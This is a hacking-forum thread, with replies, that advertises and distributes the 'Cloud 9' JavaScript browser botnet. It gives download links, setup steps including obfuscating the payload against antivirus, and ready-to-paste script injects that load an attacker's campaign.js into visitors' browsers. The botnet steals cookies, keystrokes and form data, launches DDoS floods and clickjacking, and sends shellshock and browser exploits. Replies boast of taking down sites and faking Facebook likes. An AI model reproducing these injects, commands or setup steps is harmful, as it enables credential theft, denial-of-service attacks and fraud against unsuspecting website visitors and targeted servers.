@@ -1,0 +1,342 @@
+https://hackforums.net/showthread.php?tid=5564176
+
+
+
+
+
+
+
+
+Hello HF, I'm sure many of you have been waiting for this!
+
+I have heavily updated the Cloud 9 JavaScript BotNet
+
+Old features:
+FTP flood
+Cookie stealing
+Keylogging
+Send POST requests
+Flood POST requests
+Evaluate JavaScript Code
+Silently load webpages
+Clickjacking (iframe follow mouse)
+
+New features:
+Layer 4 / Layer 7 hybrid attack (random min-max size POST flood)
+Formgrabber fixed (I think)
+Now has config file
+Now has bots online list
+OS detection added
+Panel is much more sleek
+You no longer get negative bots when bots repeatedly disconnect or some glitch happens
+RFI scanner added
+Added ability to send shellshock exploits
+You can now open pop-unders
+Non-DDoS commands run only once
+Many security updates to the panel
+
+The features are:
+Code 
+
+Stealerz:
+    cookie
+    clipboard
+
+Money makerz:
+    view*[url]*
+    jack*[iframe]*[width]*[height]*
+    popunder*[url]*
+
+DDoS Methodz:
+    load*[target url]*[milliseconds between requests]*
+    floodpost*[target url]*[params]*[milliseconds between requests]*
+    glype*[target url]*[glype list url]*[milliseconds between requests]*
+    antiddos*[target url]*[milliseconds between requests]*
+    layer4*[target url]*[minSize-maxSize]*[milliseconds between requests]*
+
+Exploitz:
+    exploit*[exe url]*
+    rfiscanner*[target url]*[backdoor url]*[rfi vuln list url]*
+    sendshellshock*[target url]*[command]*
+
+Misc:
+    md5*[hash]*[brute length]*[brute alphabet]*
+    sha1*[hash]*[brute length]*[brute alphabet]*
+    post*[url]*[params]*
+    eval*[javascript code]*
+
+Always running:
+    Multi-Language Web Keylogger
+    Form Grabber
+    
+
+
+Here is the download link to the botnet (all updates will be here):
+http://robl0x.cf/cloud9-latest.zip
+
+Mirror (will also be updated):
+http://boatnet.us/Archive/Botnet%20Files...latest.zip
+
+
+Unzip the folder on you server
+Then edit campaign.js and set master to your servers IP
+Edit admin/panel4829.php and set a new username and password for the cnc panel
+
+One way of getting tons of browsers on your net use traffic exchange sites like hitleap.com or 10khits.com
+
+To FTP flood use this command:
+Code 
+load*ftp://website.com:80/*0*
+
+
+That command will exhaust all of the connections on a webserver with only a few browsers
+
+All keylogs that are recorded are sent once the page is closed for stealth
+
+
+
+To infect a page simply put this html on it:
+http://pastebin.com/ZAvqJZD8
+
+Cloud 9 JavaScript BotNet HTML injects:-
+
+
+<script>(function(d,script){script=d.createElement('script');script.type='text/javascript';script.async=!0;script.onload=function(){};script.src='http://yourserver.com/campaign.js';d.getElementsByTagName('head')[0].appendChild(script)}(document))</script>
+ 
+Or
+ 
+<script type="text/javascript" src="http://yourserver.com/campaign.js"></script>
+
+
+
+
+the first inject is reccommended but it only works if a <head> tag exists on the page.
+
+
+
+Then whoever visits the page will be on the botnet for as long as they are on the page.
+
+I suggest putting a movie on the page so people will stay on the botnet for longer. (Good for ddos attacks)
+
+For those of you who dont know the purposes of this botnet are:
+Website monitoring
+Ad clicks amd views
+Getting facebook likes (via clickjacking)
+Distributed hash cracking
+Distributed Denial of Service (DDoS)
+Data stealing
+IP grabbing
+Exploiting servers
+and many more!
+
+Here is a picture of an active Cloud 9 botnet with 23 clients (this was before OS detection was added)
+Spoiler (Click to View)
+
+Hope you all love the update! If you have any suggestions for new features send me a PM and I should reply in 1-3 days
+
+Here is how to set it up:
+Code 
+You need to change the master variable in campaign.js to something like this:
+
+var master = "http://yoursiteorip";
+
+Also change the connection key for security.
+
+var connectKey = "randomshithere";
+
+Also be sure to edit config.php and change the connection key to the one in campaign.js
+
+Also in the config it is reccommended that you change the location of the log files and other file locations etc.
+Be sure to rename/move the files to the places you specified in the config.
+
+Once you are done those things obfuscate your campaign.js using this JavaScript obfuscator (or a different one)
+http://javascriptobfuscator.com/Javascript-Obfuscator.aspx
+
+That will protect your campaign.js from people figuring out what it is.
+
+
+
+Hope you guys like the update :D
+
+Happy hacking! Pirate
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+FAQ:-
+
+Noxiu Wrote:  
+Nothing works in it. When uploaded to server and logged in with correct login and pass it shows internal server error 500. Thats it.
+
+There is something wrong with your server man. If you are using a free web host that is a bad idea. They have probably detected the panel and exploits by now as they are from BEPS ek which is quite high profile.
+
+The exploits do not get detected on an AV after obfuscation though. 
+
+also the bots hit extremely hard.
+
+can down a site with 10-20 bots using FTP flood and a site with just 30 bots using load. plus with 20 browsers that allows CORS (Cross Orgin Request Sharing) you can down a site.
+
+im going to add some php to tell the browser to allow CORS so all the bots can hit using l4. its going to be fucking insane lulzzz
+
+
+
+
+domox Wrote:  
+I tried, first to 5000 and then to 2000 but still doesn't work. Maybe because i'm hosting it on free webhost? Btw. i'm still allowed to host this botnet on their servers lol :D 
+
+would you mind to pm me on jabber?
+
+domhdy@xmpp.jp
+
+You have edited the master variable to your websites cloud9 directory uri correct?
+What commands are you attempting to execute? Please keep in mind 80-90% of all non-DDoS commands only get executed once the browser connects and never executed again, this is mainly for stability and so the client does not notice.
+
+If you simply remove one line for example if you remove evaled = true that would allow eval to run multiple times. That way each timeout it would run the eval command as long as its there.
+
+That is more than likely your problem. It's by design.
+
+Cheers Black Hat
+
+
+
+
+
+Cyber Satan Wrote:  
+Looks good will try when I get my raspberry pi working I accidentally dragged my home folder into a different folder(stupid touch screen did it) so I'm stuck on login but as soon as I get it working I will try it out
+
+hey bro I can help you fix it.
+
+Use this tutorial to get a root shell on boot before the login screen even shows up (you can also hack vncs with this!)
+
+https://www.tecmint.com/how-to-hack-your-own-linux-system/
+
+then run
+
+"mkdir /home/yourusername"
+
+then you should be able to login, once you login go and find where you moved your home folder. Cheers!
+
+
+
+
+
+
+Sorry the main link is down at the moment.
+
+You will need to use the Mirror. I am PMing Jihadi X now with a new update.
+
+Version 2.1
+
+I have added more security to the bot API and I have also added new browser hooks for disconnection, it now has full support for mobile browsers.
+
+Also the bots use purely XMLHTTP to communicate with the API instead of image requests.
+XMLHTTP is supported by ALL browsers Yeye
+
+All bots can communicate with the server with nearly complete accuracy now.
+The panel colours have been changed slightly as well.
+
+Also since XMLHTTP is used for all communications and all browsers have proper disconnect hooks, all keylogs, and formgrabs will be sent nearly 100% of the time to the server. You will no longer lose data from your clients.
+
+
+
+
+
+I am going to release the next update. I thought FUCK it. So I'm releasing the new version that has 5 exploits now. Two are from the BEPS exploit kit (IE8 vbscript 'Godmode' and IE11 vbscript memory corruption). It now has the Microsoft Edge chakra.dll exploit as well. And the formgrabber has been fixed.
+just uploaded it. the pass is
+Spoiler (Click to Hide)
+
+Code 
+SynthMesc is daddy <3
+
+haven't fully tested all the xploits but they should work Pirate
+
+
+
+
+
+
+
+Noxiu Wrote:  
+Wanted to setup it and learn some. Had a few ideas too.
+Anyways, when i log in to panel it throws me error 500.
+Any ideas why? its apache :I
+
+i think you need to access the panel.. not the index of the admin folder..
+
+Do you access this :
+yoursite[dot]com/admin/
+
+You need to access the panel :
+yoursite[dot]com/admin/panel4829.php
+
+
+
+
+
+
+
+domox Wrote:  
+Do you know why commands doesn't work for me? I click on "Execute command" but it doesn't work
+
+[Image: b7806c62d34d1f273f41058b82ff3478.png]
+
+you have to wait for the timeout to finish.
+try lowering the timeout to 5000 (5 seconds) dont do this for a very high bot count as you my accidentally DDoS your server lol
+
+
+
+.Bux Wrote:  
+This is nice of you to share it with us
+
+If it's indeed possible to clickjack, there is alot of money potential (I'm thinking of CPA mostly, making a facebook post viral could be nice)
+
+yes you can clickjack with this. I have been using it to get facebook likes and it works perfectly Black Hat
+
+
+
+caiveman Wrote:  
+Lol @SynthMesc, I added cache poising so now my bots are persistant even when they leave the website 
+
+Rofl ty
+
+How did you do it? Via arp poisoning? Or proxy? Doing it via proxy is freakin fun. Lol I do it all the time haha.
+
+
+Awoo Wrote:  
+cache poisoning i would say
+
+... are you autistic? Both of those are all methods FOR cache poisoning.
+
+
+
+
+
+
+caiveman Wrote:  
+Real hackers.
+
+See BEEF for more
+
+This.
+
+It is super easy to get bots with a javascript botnet and like the thread says. You can use this to get advertisement clicks as well as views and website monitoring and stress testing.
+I have fixed the online list so it is 100% accurate now. You will still have to clear dead bots though. I will edit this post when it gets uploaded. Also now you have the option to enabled multiple click jacks (eg for a fb like service. Which I made host.) And the click jacker now is fully centered in the iframe!!!
+
+Cheers. Be uploaded within the next 30 mins
+
